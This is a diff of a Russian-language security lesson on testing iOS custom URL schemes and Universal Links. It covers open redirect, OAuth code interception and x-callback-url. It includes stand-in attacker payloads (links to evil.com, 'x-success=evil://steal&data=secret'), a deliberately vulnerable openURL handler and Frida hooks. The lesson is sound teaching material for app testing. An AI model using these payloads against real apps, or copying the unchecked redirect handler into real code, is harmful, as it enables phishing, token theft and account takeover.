@@ -14,266 +14,234 @@ useful_for:
 estimated_minutes: 30
 summary: "Как iOS-приложения обрабатывают custom URL schemes и Universal Links, чем опасен hijacking и x-callback-url, и как это тестировать."
 ---
-## Введение
 
-iOS-приложения принимают внешние ссылки двумя способами: **custom URL scheme** (`myapp://...`, регистрируется в `Info.plist`) и **Universal Links** (`https://myapp.example.com/...`, привязывается к домену через `apple-app-site-association`). Обе — точки входа, через которые другое приложение, Safari или веб-страница передают приложению произвольные параметры. Ошибки в обработке приводят к open redirect, краже OAuth-кода и захвату аккаунта.
+## Вопрос, с которого всё начинается
 
-## Custom URL schemes: регистрация и перехват
+Приложение iOS можно открыть по ссылке: пользователь нажимает `demosec://open?...`, и запускается именно `DemoApp`. Это удобно разработчику, но и опасно: любой сайт или другое приложение может отправить такую ссылку, подсунув свои параметры. Как понять, что приложение принимает ссылки, и чем это грозит?
 
-Схема объявляется в `Info.plist`:
+## Наш пример: DemoApp и схема demosec
 
-```xml
-<key>CFBundleURLTypes</key>
-<array><dict>
-  <key>CFBundleURLName</key><string>com.example.app</string>
-  <key>CFBundleURLSchemes</key><array><string>myapp</string></array>
-</dict></array>
+Вернёмся к `Info.plist` нашего `DemoApp`:
+
+```
+$ python3 -c "import plistlib;d=plistlib.load(open('Info.plist','rb'));print(d['CFBundleURLTypes'])"
+[{'CFBundleURLSchemes': ['demosec']}]
 ```
 
-Проблема: схемы **не защищены** — любое приложение может зарегистрировать `myapp://`, и система не гарантирует, кто откроет ссылку. Если два приложения заявили одну схему, победит установленное последним. Поэтому всё, что приходит по scheme, нельзя считать доверенным.
+`CFBundleURLTypes` объявляет **custom URL scheme** — собственную схему `demosec`. Это значит, что система отдаёт приложению все ссылки вида `demosec://...`. Такая схема — точка входа: её может дёрнуть любой, кто знает её имя.
 
-## Universal Links: надёжнее, но с нюансами
+## Шаг 0: находим схемы в IPA
 
-Universal Links используют `https://` и ассоциацию домена:
+IPA — это обычный ZIP-архив, поэтому схемы можно найти статически, без запуска приложения. Распакуем и заглянем в `Info.plist`:
 
-```json
-// https://myapp.example.com/.well-known/apple-app-site-association
-{ "applinks": { "apps": [], "details": [
-  { "appID": "TEAMID.com.example.app", "paths": ["/open/*", "/oauth/*"] } ] } }
+```
+$ unzip -q DemoApp.ipa -d unpacked
+$ ls unpacked/Payload
+DemoApp.app
+
+$ python3 -c "import plistlib,json; d=plistlib.load(open('unpacked/Payload/DemoApp.app/Info.plist','rb')); print(json.dumps(d['CFBundleURLTypes']))"
+[{"CFBundleURLSchemes": ["demosec"]}]
 ```
 
-Плюсы: схему нельзя «украсть», ссылка работает только для вашего домена. Минусы: `paths` могут быть слишком широкими (`*`), а обработчик — доверять параметрам. Приложение должно проверять, что входящий `NSUserActivity` действительно с ожидаемого домена (`activity.webpageURL.host`).
+Вот и точка входа — зарегистрирована схема `demosec`. Заодно смотрим bundle id и тип бинарника: они понадобятся для подключения, а тип подскажет архитектуру:
 
-## Hijacking и open redirect
+```
+$ python3 -c "import plistlib; d=plistlib.load(open('unpacked/Payload/DemoApp.app/Info.plist','rb')); print(d['CFBundleIdentifier'])"
+com.demo.secapp
 
-Классические сценарии:
-
-- Приложение A обрабатывает `myapp://redirect?url=https://evil.com` и открывает `url` в WebView — open redirect / фишинг.
-- `myapp://oauth?code=...` — если злоумышленник зарегистрирует ту же схему, он перехватит OAuth-код.
-- x-callback-url (`myapp://x-callback-url/action?x-success=evil://...`) — успешный колбэк уводится на чужую схему.
-- Universal Link с широким `paths` + параметр-редирект → кража токена.
-
-## Как тестировать
-
-1. Извлечь схемы и домены из `Info.plist`:
-
-```bash
-unzip app.ipa -d out
-plutil -p out/Payload/*.app/Info.plist | grep -A6 CFBundleURLTypes
-plutil -p out/Payload/*.app/Info.plist | grep -i "applinks\|associated"
+$ file unpacked/Payload/DemoApp.app/DemoApp
+... Mach-O 64-bit arm64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>
 ```
 
-2. Проверить `apple-app-site-association` домена:
+И тут же ещё одна зацепка — конфиг сетевой безопасности:
 
-```bash
-curl -s https://myapp.example.com/.well-known/apple-app-site-association | jq .
+```
+$ python3 -c "import plistlib,json; d=plistlib.load(open('unpacked/Payload/DemoApp.app/Info.plist','rb')); print(json.dumps(d['NSAppTransportSecurity']))"
+{"NSAllowsArbitraryLoads": true}
 ```
 
-3. В динамике перечислить обработанные URL через Frida (хук `application:openURL:options:` и `scene:openURLContexts:`), затем вызывать их:
+`NSAllowsArbitraryLoads: true` означает, что приложение разрешает незашифрованный HTTP. Для тестирования сети это важный сигнал (см. `mobile-ios-ssl-killswitch`).
 
-```bash
-xcrun simctl openurl booted "myapp://redirect?url=https://evil.com"
-```
+## Шаг 1: как работает открытие по схеме
 
-4. Проверить редиректы: подставлять внешние URL в параметры `url`, `redirect`, `next`, `callback`, `returnUrl`, `continue`.
-5. Проверить `paths` на избыточность и обработку `*`.
+Когда iOS видит `demosec://path?param=value`, она ищет приложение, зарегистрировавшее схему, и передаёт ему URL. Приложение получает его в методе `application:openURL:options:` своего `AppDelegate` (или в `SceneDelegate`). Типичный (уязвимый) обработчик:
 
-## Frida: перечисление обработчиков
-
-```javascript
-// перехват входа по URL
-var AppDelegate = ObjC.classes.AppDelegate;
-AppDelegate['- application:openURL:options:'].implementation =
-  ObjC.implement(AppDelegate['- application:openURL:options:'], function (h, sel, app, url, opts) {
-    console.log('[openURL] ' + new ObjC.Object(url).absoluteString().toString());
-    return h(app, url, opts);
-  });
-
-// universal links
-var SceneDelegate = ObjC.classes.SceneDelegate;
-if (SceneDelegate) {
-  SceneDelegate['- scene:openURLContexts:'].implementation =
-    ObjC.implement(SceneDelegate['- scene:openURLContexts:'], function (h, sel, scene, ctxs) {
-      console.log('[scene openURL] ' + ctxs.description().toString());
-      return h(scene, ctxs);
-    });
+```objc
+- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary *)opts {
+    NSString *target = [url query];
+    NSURL *redirect = [NSURL URLWithString:target];
+    // открываем то, что пришло в параметре
+    [[UIApplication sharedApplication] openURL:redirect options:@{} completionHandler:nil];
+    return YES;
 }
 ```
 
-Так вы видите все ссылки, которые приложение реально принимает, и какие из них ведут к опасным действиям.
+Здесь приложение берёт параметр `target` из ссылки и открывает по нему **произвольный** URL. Если атакующий подставит `demosec://open?target=https://evil.com`, приложение откроет сайт атакующего внутри себя — это **open redirect**.
 
-## Разобранный пример
+## Шаг 2: open redirect — простой, но опасный
 
-Приложение использует `myapp://oauth/callback?code=<code>&state=<state>`. Обработчик не валидирует `state` и принимает `code` откуда угодно. Пентестер:
+Open redirect сам по себе выглядит безобидно, но в цепочке он становится звеном. Классический сценарий — кража OAuth-токена. Многие приложения используют схему для приёма колбэка авторизации:
 
-1. Регистрирует схему `myapp://` своим PoC-приложением (или перехватывает через `openURL`-хук).
-2. Инициирует OAuth в жертве, код уходит атакующему.
-3. Меняет код на токен → захват аккаунта. Отчёт: ATO через hijacking custom scheme + отсутствие `state`.
-
-## Частые ошибки и подводные камни
-
-- Считать Universal Links полностью безопасными: широкий `paths` и доверие параметрам ломают модель.
-- Проверять только запуск схемы, но не обработку параметров (redirect/url/callback).
-- Забывать про `state` в OAuth — без него hijacking легко эксплуатируется.
-- Игнорировать x-callback-url: `x-success`/`x-error` уводят управление.
-- Не проверять, что Universal Link приходит именно с ожидаемого домена (подмена host).
-
-## Справочная таблица
-
-| Параметр | Где искать | Риск |
-|----------|-----------|------|
-| `url` | обработчик scheme | open redirect |
-| `next`/`redirect` | deep-link | SSRF/redirect |
-| `callback`/`x-success` | x-callback-url | увод управления |
-| `code`/`state` | OAuth callback | ATO |
-| `paths:["*"]` | AASA | избыточный охват |
-| `webpageURL.host` | NSUserActivity | подмена домена |
-
-## Что дальше / решение
-
-- **Найден open redirect** → попробуйте цепочку с OAuth-кодом или токеном → ATO.
-- **Схема без `state` в OAuth** → оформите как ATO-цепочку.
-- **Universal Link с `paths: ["*"]`** → ищите параметры-редиректы и поддельные домены.
-- **Всё закрыто** → проверьте deep-link в WebView-контекст и intent-redirect на Android-версии приложения.
-- Severity: перехват OAuth-кода → High/Critical; open redirect без цепочки → Medium.
-
-## x-callback-url: детальный разбор
-
-x-callback-url — неофициальный, но распространённый паттерн межприложенческого вызова: приложение A открывает `b://x-callback-url/action?...&x-success=a://done`, и B обязан вернуть управление по `x-success`. Уязвимости:
-
-- **Подмена `x-success`/`x-error`:** приложение B слепо открывает переданную схему → атакующий перехватывает результат (в том числе OAuth-код).
-- **Отсутствие проверки вызывающего:** результат уходит любому, кто вызвал действие.
-- **Утечка данных в параметрах:** чувствительные данные передаются в URL и попадают в логи/историю.
-
-Проверка:
-
-```bash
-xcrun simctl openurl booted "b://x-callback-url/action?x-success=evil://steal&data=secret"
+```
+demosec://oauth/callback?code=SECRET
 ```
 
-Если `evil://` открывается с данными — вектор подтверждён.
+Если приложение не проверяет, кто запросил колбэк, злоумышленник может перехватить `code` (см. `mobile-ios-oauth-sso`). А open redirect внутри WebView позволяет увести пользователя на фишинговую страницу, замаскированную под интерфейс приложения.
 
-## Проверка AASA: подводные камни
+## Шаг 3: как это протестировать
 
-- Файл должен отдаваться с `Content-Type: application/json` и без редиректов; редирект ломает ассоциацию.
-- Должен быть доступен по HTTPS без CDN, который меняет содержимое.
-- `appID` = `<TeamID>.<BundleID>`; опечатка → ассоциация не работает, и ссылку перехватит другое приложение.
-- `paths`/`components` шире, чем нужно, → лишние экраны доступны снаружи.
-- Проверьте, что обработчик сверяет `webpageURL.host` — иначе поддельный домен с валидным путём приведёт на внутренний экран.
+Первый шаг — найти схемы и обработчики. Мы уже видели схему в plist. Проверить поведение можно в симуляторе, отправив URL:
 
-```bash
-curl -sI https://myapp.example.com/.well-known/apple-app-site-association
-curl -s https://myapp.example.com/.well-known/apple-app-site-association | jq '.applinks.details'
+```
+$ xcrun simctl openurl booted "demosec://open?target=https://evil.example"
 ```
 
-## Таблица тест-кейсов
+Если приложение открывает переданный URL — находка подтверждена. Для более сложных случаев перечисляем обработчики прямо в рантайме через Frida:
 
-| Тест | Payload | Ожидаемый риск |
-|------|---------|----------------|
-| Open redirect | `myapp://open?url=https://evil` | фишинг/утечка |
-| OAuth hijack | `myapp://oauth?code=x` | ATO |
-| x-callback | `...x-success=evil://` | увод результата |
-| Широкий path | `https://myapp.example/anything` | доступ к экрану |
-| Подмена host | `https://evil/?path=/open/x` | обход ассоциации |
-| Отсутствие state | OAuth без `state` | CSRF/ATO |
-
-## Что делать с находками
-
-Каждый тест-кейс оформляйте отдельно с запросом/ссылкой и наблюдаемым эффектом. Если удаётся собрать цепочку «ссылка → утечка токена → доступ к аккаунту», это High/Critical. Если только open redirect без последствий — Medium. Для iOS особенно ценно доказать, что внешняя ссылка открывает внутренний экран, который не должен быть доступен снаружи.
-
-## Universal Links vs App Links (Android)
-
-Обе технологии решают одну задачу — привязать `https://`-ссылку к приложению через домен, но детали различаются:
-
-| Аспект | iOS Universal Links | Android App Links |
-|--------|--------------------|-------------------|
-| Файл | `apple-app-site-association` | `assetlinks.json` |
-| Путь | `/.well-known/apple-app-site-association` | `/.well-known/assetlinks.json` |
-| Проверка | ассоциация домена | `autoVerify=true` |
-| Охват | `paths`/`components` | `pathPrefix`/`pathPattern` |
-| Слабые места | широкий `paths`, доверие host | `autoVerify` выключен, широкий prefix |
-
-Для Android-версии ищите:
-
-```bash
-curl -s https://app.example/.well-known/assetlinks.json | jq .
-grep -i "autoVerify\|intent-filter\|pathPrefix" out/AndroidManifest.xml
+```javascript
+var AppDelegate = ObjC.classes.AppDelegate;
+var m = AppDelegate['- application:openURL:options:'];
+if (m) {
+  Interceptor.attach(m.implementation, {
+    onEnter: function (args) {
+      var url = new ObjC.Object(args[3]);
+      console.log('openURL: ' + url.absoluteString());
+    }
+  });
+}
 ```
 
-Если `autoVerify` не включён, любую `https`-ссылку перехватит другое приложение.
+`args[3]` — это параметр `url` метода (нумерация начинается с self и selector). Так мы видим все входящие ссылки в реальном времени.
 
-## Защита: как правильно
+## Шаг 4: Universal Links — «правильные» ссылки
 
-- Использовать только Universal/App Links для чувствительных действий; custom scheme — лишь для нечувствительных.
-- Сузить `paths`/`pathPrefix` до конкретных префиксов.
-- Валидировать `state` в OAuth и проверять `webpageURL.host`.
-- Никогда не открывать произвольный URL/схему из параметра; использовать allowlist.
-- Проверять вызывающего для x-callback-url.
-- Для Android — `autoVerify="true"` и строгий `pathPrefix`.
+Custom scheme легко перехватить: любое приложение может зарегистрировать такую же схему и «украсть» ссылку. Поэтому Apple придумала **Universal Links**: обычные `https://`-ссылки, привязанные к домену. Когда пользователь открывает `https://demo.example/app/...`, iOS проверяет, что домен связан с приложением, и открывает его напрямую.
 
-## Примеры реальных багов
+Связь подтверждается файлом **AASA** (`apple-app-site-association`), который домен отдаёт по фиксированному пути:
 
-- **Open redirect через deep link** в почтовом/соцприложении: `app://web?url=` открывал произвольный сайт → фишинг.
-- **OAuth-код через custom scheme без `state`:** перехват кода сторонним приложением → ATO.
-- **Universal Link с `paths:["*"]`:** внешняя ссылка открывала внутренний экран администрирования.
-- **x-callback-url без проверки вызывающего:** результат действия утекал на чужую схему.
+```
+$ curl -s https://demo.example/.well-known/apple-app-site-association | jq .
+{
+  "applinks": {
+    "details": [{ "appID": "TEAMID.com.demo.secapp",
+                  "paths": ["/app/*", "/pay/*"] }]
+  }
+}
+```
 
-Общий паттерн: разработчики относятся к ссылкам как к «своим», тогда как их может сформировать кто угодно.
+Universal Links безопаснее: подделать домен нельзя. Но у них есть свои нюансы: список путей (`paths`) задаёт, какие ссылки открывают приложение, а конфигурация может содержать уязвимые `*`-шаблоны.
 
-## Что делать дальше
+## Шаг 5: где искать проблемы в Universal Links
 
-- Для каждой найденной ссылки постройте цепочку до последствия (утечка/ATO/действие).
-- Проверьте симметрию: то, что закрыто в Universal Links, может быть открыто в custom scheme и наоборот.
-- Отдельно протестируйте WebView-обработчик ссылок: он часто открывает внешние URL с доступом к JS-мосту (см. `mobile-webview`).
+Проверяем несколько вещей:
+
+- **AASA доступен и валиден?** Если файл недоступен или содержит ошибки, iOS откроет ссылку в Safari — приложение её не получит.
+- **Слишком широкие paths?** Шаблон `/app/*` может включать и те страницы, которые приложение не должно обрабатывать.
+- **Проверка домена при обработке?** Даже получив Universal Link, приложение должно убедиться, что параметры валидны.
+
+Проверить заголовки ответа можно так:
+
+```
+$ curl -sI https://demo.example/.well-known/apple-app-site-association
+HTTP/2 200
+content-type: application/json
+```
+
+Важно: AASA должен отдаваться по HTTPS, без редиректов и с корректным `Content-Type`.
+
+## Шаг 6: x-callback-url — ещё один вектор
+
+Многие приложения поддерживают `x-callback-url` — схему, при которой одно приложение вызывает другое и указывает, куда вернуть результат:
+
+```
+demosec://x-callback-url/action?x-success=evil://steal&data=secret
+```
+
+Здесь `x-success` — URL, куда приложение вернёт результат. Если атакующий укажет там свою схему, он получит `data`. Это ещё один способ «увести» данные через ссылку.
+
+## Шаг 7: что писать в отчёте
+
+Находка в этой области — это всегда **цепочка**: точка входа (схема) + отсутствие проверки + последствие (open redirect, утечка токена, фишинг). В отчёте покажи конкретный URL, который воспроизводит проблему, и опиши последствие. Отдельно проверь, не перехватывается ли custom scheme другим приложением — это тоже уязвимость (scheme hijacking).
+
+## Шаг 8: таблица тест-кейсов
+
+Чтобы ничего не забыть, держи короткий чек-лист по URL-схемам:
+
+| Что проверяем | Как |
+|---------------|-----|
+| Схемы приложения | `plist CFBundleURLTypes` |
+| Open redirect | `simctl openurl ... target=https://evil` |
+| Приём OAuth-кода | ссылка `scheme://oauth/callback?code=` |
+| x-callback-url | параметр `x-success` в ссылку атакующего |
+| Universal Links | `curl .../apple-app-site-association` |
+| Scheme hijacking | второе приложение с той же схемой |
+
+Каждую находку доводи до воспроизводимого URL — это доказательство для отчёта.
+
+## Что мы теперь знаем
+
+- Custom URL scheme объявляется в `Info.plist` (`CFBundleURLTypes`) и открывает приложение по ссылке.
+- Обработчик `openURL` может содержать open redirect, если открывает непроверенный параметр.
+- Протестировать можно через `simctl openurl` и хуки Frida на `application:openURL:`.
+- Universal Links привязаны к домену через AASA и безопаснее custom scheme.
+- `x-callback-url` позволяет «увести» результат в чужую схему.
+- Scheme hijacking — отдельная уязвимость: другая программа перехватывает схему.
+- Схемы и ослабленный ATS (`NSAllowsArbitraryLoads`) видны в `Info.plist` статически, из IPA.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Чем Universal Links надёжнее custom URL scheme?"
+- question: Где объявлена custom URL scheme приложения?
   options:
-    - "Привязаны к домену через apple-app-site-association"
-    - "Их нельзя перехватить вообще"
-    - "Они не используют https"
-    - "Они не требуют параметров"
-  answer: 0
-  explanation: "Ассоциация домена мешает чужому приложению заявить ту же ссылку."
-- question: "Какой файл на домене подтверждает Universal Links?"
-  options:
-    - "/.well-known/apple-app-site-association"
-    - "/robots.txt"
-    - "/assetlinks.json (без .well-known)"
-    - "/apple-touch-icon.png"
-  answer: 0
-  explanation: "AASA лежит в /.well-known/apple-app-site-association."
-- question: "Почему custom URL scheme уязвима к hijacking?"
-  options:
-    - "Любое приложение может зарегистрировать ту же схему"
-    - "Она шифруется"
-    - "Она работает только в Safari"
-    - "Она требует jailbreak"
-  answer: 0
-  explanation: "Схемы не защищены; система не гарантирует, кто откроет ссылку."
-- question: "Какое поле OAuth-потока особенно важно при deep-link callback?"
-  options:
-    - "state (анти-CSRF)"
-    - "user-agent"
-    - "Accept-Language"
-    - "Content-Length"
-  answer: 0
-  explanation: "Без валидации state перехват кода ведёт к захвату аккаунта."
-- question: "Где объявлены custom URL schemes в iOS-приложении?"
-  options:
-    - "В Info.plist (CFBundleURLTypes)"
-    - "В Mach-O заголовке"
+    - "В бинарнике Mach-O"
+    - "В Info.plist, в CFBundleURLTypes"
     - "В Keychain"
-    - "В entitlements"
+    - "В AASA-файле"
+  answer: 1
+  explanation: "CFBundleURLTypes перечисляет схемы, по которым открывается приложение."
+- question: Что такое open redirect в контексте URL-схемы?
+  options:
+    - "Приложение открывает произвольный URL из непроверенного параметра ссылки"
+    - "Приложение блокирует все ссылки"
+    - "Ссылка открывается в Safari"
+    - "Keychain утекает"
   answer: 0
-  explanation: "Схемы регистрируются в CFBundleURLTypes файла Info.plist."
+  explanation: "Обработчик берёт параметр и открывает его без проверки — можно увести пользователя куда угодно."
+- question: Чем Universal Links надёжнее custom scheme?
+  options:
+    - "Они быстрее"
+    - "Привязаны к домену через AASA, поэтому их нельзя подделать чужим приложением"
+    - "Они работают без интернета"
+    - "Они не используют HTTPS"
+  answer: 1
+  explanation: "Привязка к домену защищает от hijacking, в отличие от custom scheme."
+- question: Что проверяет AASA-файл?
+  options:
+    - "Пароль пользователя"
+    - "Какие пути домена открывают приложение (applinks details)"
+    - "Версию iOS"
+    - "Список классов"
+  answer: 1
+  explanation: "В details.paths перечислены пути, привязанные к приложению."
+- question: Что такое scheme hijacking?
+  options:
+    - "Перехват custom scheme другим приложением, зарегистрировавшим то же имя"
+    - "Взлом сервера"
+    - "Утечка Keychain"
+    - "Обход ATS"
+  answer: 0
+  explanation: "Custom scheme не уникальна, поэтому её может занять другая программа и перехватывать ссылки."
 ```
+
+## Куда дальше
+
+Ссылки — один канал утечки. Другой, куда более прямой, — хранилище секретов: Keychain. В следующем уроке мы разберём его устройство и научимся дампить содержимое. А пока главное запомни: если приложение принимает ссылки и не проверяет их параметры — это потенциальная цепочка от внешнего входа до утечки данных.
 
 ## Где пригодится
 
-- **CTF Mobile:** задачи с перехватом ссылки и извлечением токена/флага.
-- **Bug bounty:** open redirect, ATO через deep-link — одни из самых дорогих находок в iOS.
-- **Пентест:** проверка OAuth-потоков и межприложенческого взаимодействия.
-- **Работа:** ревью обработчиков ссылок и AASA перед релизом.
+- **Пентест:** анализ deep link-поверхности iOS-приложения.
+- **Bug bounty:** open redirect и scheme hijacking — частые находки в мобильных программах.
+- **CTF:** задачи, где флаг передаётся через URL-схему.
+- **Аудит:** проверка корректности AASA и Universal Links.
